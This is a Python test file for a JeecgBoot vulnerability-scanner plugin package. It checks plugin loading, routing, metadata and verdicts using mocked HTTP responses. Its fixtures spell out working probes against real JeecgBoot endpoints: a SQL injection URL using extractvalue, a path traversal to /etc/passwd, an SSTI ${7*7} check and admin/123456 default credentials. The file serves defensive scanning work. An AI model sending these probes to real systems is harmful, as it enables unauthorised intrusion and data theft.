# F5 JeecgBoot 插件包测试：路由/元信息/三态判定（首个拓展框架验收）
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from core.loader import load_plugins
from core.router import Router


class FakeResp:
    def __init__(self, text="", status_code=200, headers=None):
        self.text = text
        self.status_code = status_code
        self.headers = headers if headers is not None else {"Content-Type": "application/json"}


class FakeSession:
    def __init__(self, responses):
        self.responses = responses

    def get(self, url, **kw):
        return self.responses.get(url, FakeResp("", 404))

    def post(self, url, data=None, headers=None, **kw):
        return self.responses.get(url, FakeResp("", 404))


def test_f5_plugin_package_registered():
    """F5: jeecgboot 插件包加载（8 个 POC）"""
    plugins = load_plugins("plugins.jeecgboot")
    assert len(plugins) == 8, f"应有 8 个 JeecgBoot 插件，实际 {len(plugins)}"
    names = [getattr(p, "name", "") for p in plugins]
    assert "JeecgBoot 报表 SSTI" in names
    assert "JeecgBoot queryUserByDepId SQL注入" in names
    print("PASS test_f5_plugin_package_registered: %d 个插件" % len(plugins))


def test_f5_router_mapping():
    """F5: Router 路由 jeecgboot → plugins.jeecgboot"""
    from common.models import FingerprintResult

    fp = FingerprintResult(cms="jeecgboot", confidence=1.0, matched=["test"])
    plugins = Router().resolve(fp)
    assert len(plugins) == 8, f"jeecgboot 应路由 8 个插件，实际 {len(plugins)}"
    print("PASS test_f5_router_mapping")


def test_f5_ssti_confirm():
    """SSTI：${7*7} → 49 回显 → CONFIRMED"""
    from plugins.jeecgboot.freemarker_ssti import JeecgFreemarkerSstiPlugin

    sess = FakeSession({"/x": None})  # placeholder
    sess = FakeSession(
        {"http://target/jeecg-boot/jmreport/testConnection": FakeResp('{"49":1}', 200)}
    )
    res = JeecgFreemarkerSstiPlugin().verify("http://target/", sess)
    assert res.status == STATUS_CONFIRMED, res.status
    assert res.severity == "high"
    print("PASS test_f5_ssti_confirm")


def test_f5_ssti_safe():
    """SSTI：无 49 回显 → SAFE"""
    from plugins.jeecgboot.freemarker_ssti import JeecgFreemarkerSstiPlugin

    sess = FakeSession(
        {"http://target/jeecg-boot/jmreport/testConnection": FakeResp('{"code":500,"msg":"db error"}', 500)}
    )
    res = JeecgFreemarkerSstiPlugin().verify("http://target/", sess)
    assert res.status == STATUS_SAFE, res.status
    print("PASS test_f5_ssti_safe")


def test_f5_ssti_unknown():
    """SSTI：网络异常 → UNKNOWN（绝不判 SAFE）"""
    from plugins.jeecgboot.freemarker_ssti import JeecgFreemarkerSstiPlugin

    class ErrSession(FakeSession):
        def post(self, url, data=None, headers=None, **kw):
            raise Exception("connection refused")

    res = JeecgFreemarkerSstiPlugin().verify("http://target/", ErrSession({}))
    assert res.status == STATUS_UNKNOWN, res.status
    print("PASS test_f5_ssti_unknown")


def test_f5_sqli_confirm():
    """queryUserByDepId：extractvalue 报错特征 → CONFIRMED"""
    from plugins.jeecgboot.sql_inject_query_user import JeecgSqlInjectQueryUserPlugin

    sess = FakeSession(
        {
            "http://target/jeecg-boot/sys/user/queryUserByDepId?depId=1'%20and%20extractvalue(1,concat(0x7e,user()))--": FakeResp(
                '{"message":"XPATH syntax error: \'~root@localhost\'"}', 200
            ),
        }
    )
    res = JeecgSqlInjectQueryUserPlugin().verify("http://target/", sess)
    assert res.status == STATUS_CONFIRMED, res.status
    assert "extractvalue" in res.evidence.lower()
    print("PASS test_f5_sqli_confirm")


def test_f5_file_read_confirm():
    """/common/download 路径穿越 → root 特征 → CONFIRMED"""
    from plugins.jeecgboot.file_read_download import JeecgFileReadDownloadPlugin

    sess = FakeSession(
        {
            "http://target/jeecg-boot/common/download?fileName=../../../../../../etc/passwd": FakeResp(
                "root:x:0:0:root:/root:/bin/bash\n", 200
            ),
        }
    )
    res = JeecgFileReadDownloadPlugin().verify("http://target/", sess)
    assert res.status == STATUS_CONFIRMED, res.status
    print("PASS test_f5_file_read_confirm")


def test_f5_default_password_confirm():
    """默认口令：admin/123456 登录返回 token → CONFIRMED"""
    from plugins.jeecgboot.default_password import JeecgDefaultPasswordPlugin

    sess = FakeSession(
        {
            "http://target/jeecg-boot/sys/login": FakeResp('{"success":true,"result":{"token":"xxx"}}', 200),
        }
    )
    res = JeecgDefaultPasswordPlugin().verify("http://target/", sess)
    assert res.status == STATUS_CONFIRMED, res.status
    print("PASS test_f5_default_password_confirm")


def test_f5_meta_complete():
    """F5: 8 个插件元信息完整（cve/severity/fix_detail/reproduce/cvss/compliance）"""
    from lib.plugin_sdk import check_plugin_by_import  # noqa: F401

    for cls in load_plugins("plugins.jeecgboot"):
        inst = cls()
        assert inst.cve, f"{cls.__name__} 缺少 cve"
        assert inst.fix_detail, f"{cls.__name__} 缺少 fix_detail"
        assert inst.reproduce, f"{cls.__name__} 缺少 reproduce"
        assert inst.cvss_vector, f"{cls.__name__} 缺少 cvss_vector"
        assert inst.compliance, f"{cls.__name__} 缺少 compliance"
    print("PASS test_f5_meta_complete")


if __name__ == "__main__":
    test_f5_plugin_package_registered()
    test_f5_router_mapping()
    test_f5_ssti_confirm()
    test_f5_ssti_safe()
    test_f5_ssti_unknown()
    test_f5_sqli_confirm()
    test_f5_file_read_confirm()
    test_f5_default_password_confirm()
    test_f5_meta_complete()
    print("ALL_F5_TESTS_PASS")
